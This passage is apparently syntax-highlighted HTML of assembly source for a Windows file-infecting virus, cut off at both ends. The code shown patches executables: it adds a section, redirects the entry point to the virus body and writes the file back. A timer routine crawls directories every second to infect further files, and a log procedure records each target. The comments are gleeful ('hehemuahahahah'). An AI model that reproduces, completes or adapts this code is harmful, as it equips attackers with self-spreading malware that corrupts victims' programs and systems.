</span><span class="sc1">;Ok, now, just inc the number of sections!</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;easy!</span><span class="sc0">

</span><span class="sc1">;Now, let's change the entry point...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VStart</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusBegin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc1">;Well... just save our work...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SFSeek</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;overlapped?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;here will be number of bytes written</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlOff</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SFlSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;from there...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;and there!</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SWriteFile</span><span class="sc0">               </span><span class="sc1">;hehemuahahahah    AHAHA!</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SMFree</span><span class="sc0">                  </span><span class="sc1">;free that unneeded mem</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SCloseHndl</span><span class="sc0">              </span><span class="sc1">;Ok</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OkRet</span><span class="sc0">

</span><span class="sc5">ErrRetB</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SMFree</span><span class="sc0">
</span><span class="sc5">ErrRetA</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SCloseHndl</span><span class="sc0">
</span><span class="sc5">ErrRet</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">IFARet</span><span class="sc0">
</span><span class="sc5">OkRet</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">IFARet</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectFileA</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">TimerProc</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hWnd</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">uMsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">idEvent</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwTime</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc1">;Thus is called each second and try to infect the next file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SReloc</span><span class="sc0">
</span><span class="sc5">SReloc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SReloc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;1 iteration = 2 try</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wfd</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">TimerStart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;File attribute</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TPUpDir</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_COMPRESSED</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TPNextFile</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ConcatPath</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DriveIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddLog</span><span class="sc0">

</span><span class="sc1">;        push    L MB_OK</span><span class="sc0">
</span><span class="sc1">;        lea     eax,[offset InfectStr+edi]</span><span class="sc0">
</span><span class="sc1">;        push    eax</span><span class="sc0">
</span><span class="sc1">;        push    esi</span><span class="sc0">
</span><span class="sc1">;        push    L 0</span><span class="sc0">
</span><span class="sc1">;        CallID  SMsgBox</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFileA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">TPNextFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FndHndlIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FndHndl</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">CallID</span><span class="sc0">  </span><span class="sc5">SFNFile</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TPRet</span><span class="sc0">                           </span><span class="sc1">;Found =&gt; not down_dir</span><span class="sc0">
</span><span class="sc5">TPDownDir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FndHndlIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FndHndl</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">CallICD</span><span class="sc0"> </span><span class="sc5">SFCFile</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">TPNextDrive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FndHndlIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LogDirStr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddLog</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">'*.*\'
</span><span class="sc0">        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TPNextFile</span><span class="sc0">
</span><span class="sc5">TPUpDir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;File name   </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">             </span><span class="sc1">;for "." and ".."</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">TPNextFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FndHndlIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FndHndlIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ConcatPath</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'*.*\'          ;"\*.*"for those who don'</span><span class="sc5">t</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DriveIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddLog</span><span class="sc0">
</span><span class="sc1">;        push    L MB_OK</span><span class="sc0">
</span><span class="sc1">;        lea     eax,[offset SubDirStr+edi]</span><span class="sc0">
</span><span class="sc1">;        push    eax</span><span class="sc0">
</span><span class="sc1">;        lea     eax,[offset DriveIndx+edi]</span><span class="sc0">
</span><span class="sc1">;        push    eax</span><span class="sc0">
</span><span class="sc1">;        push    L 0</span><span class="sc0">
</span><span class="sc1">;        CallID  SMsgBox</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DriveIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">CallID</span><span class="sc0">  </span><span class="sc5">SFFFile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">TPDownDir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FndHndlIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FndHndl</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TPRet</span><span class="sc0">
</span><span class="sc5">TPNextDrive</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Here, it would be next drive ( c: -&gt; d: -&gt; ... ), but not yet found...</span><span class="sc0">
</span><span class="sc1">;i just kill my timer</span><span class="sc0">
</span><span class="sc1">;        mov     dword ptr [offset FndHndlIndx+edi],0</span><span class="sc0">
</span><span class="sc1">;        mov     PathName[edi],0</span><span class="sc0">
</span><span class="sc1">;        push    edx</span><span class="sc0">
</span><span class="sc1">;        lea     eax,[offset DriveIndx+edi]</span><span class="sc0">
</span><span class="sc1">;        push    eax</span><span class="sc0">
</span><span class="sc1">;        CallID  SFFFile</span><span class="sc0">
</span><span class="sc1">;        mov     FndHndl[edi],eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SKillTimer</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TPEnd</span><span class="sc0">
</span><span class="sc5">TPRet</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TimerStart</span><span class="sc0">
</span><span class="sc5">TPEnd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TimerProc</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ConcatPath</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; parm: -</span><span class="sc0">
</span><span class="sc1">; ret: [ebx] = 0 of end of string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wfd</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">+</span><span class="sc5">MAX_PATH</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;8.3 name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CPNamed</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0">                            </span><span class="sc1">;8.3 name = real name</span><span class="sc0">
</span><span class="sc5">CPNamed</span><span class="sc4">:</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">CPBcl</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CPFBcl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CPBcl</span><span class="sc0">
</span><span class="sc5">CPFBcl</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ConcatPath</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">AddLog</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StrLen</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;overlapped?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save2</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;here will be number of bytes written</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;from there...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LogHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;and there!</span><span class="sc0">
        </span><span class="sc5">CallID</span><span class="sc0">  </span><span class="sc5">SWriteFile</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;overlapped?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save2</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;here will be number of bytes written</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LogHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;and there!</span><span class="sc0">
        </span><span class="sc5">CallID</span><span class="sc0">  </span><span class="sc5">SWriteFile</span><span class="sc0">
        
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AddLog</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">StrLen</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
